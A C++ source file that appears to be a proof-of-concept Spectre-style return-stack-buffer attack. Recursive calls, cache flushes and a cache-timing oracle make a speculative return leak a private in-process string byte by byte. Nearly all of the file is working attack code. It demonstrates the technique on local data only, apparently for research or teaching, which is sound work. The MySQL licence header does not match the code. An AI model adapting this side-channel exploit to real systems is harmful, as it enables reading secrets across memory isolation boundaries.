/*
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License, version 2.0,
 *  as published by the Free Software Foundation.
 *  This program is also distributed with certain software (including
 *  but not limited to OpenSSL) that is licensed under separate terms,
 *  as designated in a particular file or component or in included license
 *  documentation.  The authors of MySQL hereby grant you an additional
 *  permission to link the program and your derivative works with the
 *  separately licensed software that they have included with MySQL.
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License, version 2.0, for more details.
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301  USA
**/

#include <array>
#include <cstring>
#include <iostream>
#include <vector>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "utils.h"

constexpr size_t kRecursionDepth = 64;

const char *data = nullptr;
size_t current_offset = -1;
const std::array<BigByte, 256> *oracle_ptr;
std::vector<char *> stack_mark_pointers;

SAFESIDE_NEVER_INLINE
void Recursor(size_t depth) {
  if (depth > 0) {
    char stack_mark = 'a';
    stack_mark_pointers.push_back(&stack_mark);
    Recursor(depth - 1);
    FlushFromCache(&stack_mark, stack_mark_pointers.back());
    stack_mark_pointers.pop_back();
  }
}

SAFESIDE_NEVER_INLINE
void Wrapper() {
  char stack_mark = 'a';
  stack_mark_pointers.push_back(&stack_mark);
  Recursor(kRecursionDepth);
  FlushFromCache(&stack_mark, stack_mark_pointers.back());
  stack_mark_pointers.pop_back();
}

static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;
  oracle_ptr = &sidechannel.GetOracle();
  const std::array<BigByte, 256> &oracle = *oracle_ptr;

  for (int run = 0;; ++run) {
    // We pick a different offset every time so that it's guaranteed that the
    // value of the in-bounds access is usually different from the secret value
    // we want to leak via out-of-bounds speculative access.
    size_t safe_offset = run % strlen(public_data);

    sidechannel.FlushOracle();

    data = public_data;
    current_offset = safe_offset;
    Wrapper();
    ForceRead(oracle.data() + static_cast<unsigned char>(data[current_offset]));

    data = private_data;
    current_offset = offset;
    Wrapper(); // This returns speculatively to the ForceRead call above if RSB falls back to BTB.

    std::pair<bool, char> result = sidechannel.RecomputeScores(public_data[safe_offset]);
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
